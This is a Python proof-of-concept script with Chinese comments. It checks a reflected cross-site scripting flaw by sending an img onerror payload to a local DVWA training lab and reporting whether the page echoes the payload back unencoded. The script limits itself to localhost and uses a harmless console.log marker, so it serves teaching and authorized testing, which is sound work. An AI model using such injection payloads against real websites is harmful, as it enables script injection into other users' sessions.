#!/usr/bin/env python3
"""XSS-003 反射型 XSS 教学验证草案（无害标记，仅限本机授权靶场）。

用法示例:
  python poc_xss_003.py --base http://127.0.0.1/dvwa --path /vulnerabilities/xss_r/ --param name --cookie-file cookie.txt

约束: 仅允许 localhost/127.0.0.1/::1；不跟随重定向；不打印 Cookie/口令。
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "LLM_LAB_XSS"
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
DEFAULT_PAYLOAD = "<img src=x onerror=console.log('LLM_LAB_XSS')>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_args():
    parser = argparse.ArgumentParser(description="XSS-003 验证草案")
    parser.add_argument("--base", required=True, help="靶场基址，例如 http://127.0.0.1/dvwa")
    parser.add_argument("--path", required=True, help="目标页面路径，例如 /vulnerabilities/xss_r/")
    parser.add_argument("--param", default="name", help="请求参数名，默认 name")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="无害测试载荷")
    parser.add_argument("--cookie-file", default=None, help="本地文件中的 Cookie 头，内容不打印")
    parser.add_argument("--timeout", type=float, default=10.0, help="请求超时秒数")
    return parser.parse_args()


def build_url(args):
    url = args.base.rstrip("/") + "/" + args.path.lstrip("/")
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        sys.exit("协议不被允许: " + str(parts.scheme))
    if (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        sys.exit("仅允许本机地址，收到: " + str(parts.hostname))
    return url


def main():
    args = parse_args()
    url = build_url(args)
    target = url + ("&" if "?" in url else "?") + urllib.parse.urlencode({args.param: args.payload})
    headers = {"User-Agent": "XSS-003-lab-draft"}
    if args.cookie_file:
        with open(args.cookie_file, "r", encoding="utf-8") as handle:
            headers["Cookie"] = handle.read().strip()
    request = urllib.request.Request(target, headers=headers, method="GET")
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=args.timeout) as response:
            status = response.status
            body = response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        sys.exit("HTTP 错误: %s（302 多为未登录，需人工确认认证与路径）" % exc.code)
    except urllib.error.URLError as exc:
        sys.exit("连接失败: %s" % exc.reason)
    print("target:", target)
    print("status:", status)
    print("payload_raw_in_body:", args.payload in body)
    print("payload_html_encoded:", "&lt;img" in body)
    if args.payload in body:
        print("回显观察: 响应中 payload 以原始标签出现；浏览器是否执行需人工在 Console 观察 " + MARKER)
    else:
        print("回显观察: 未发现原样 payload；核对参数名、登录状态、难度配置与输出编码")


if __name__ == "__main__":
    main()
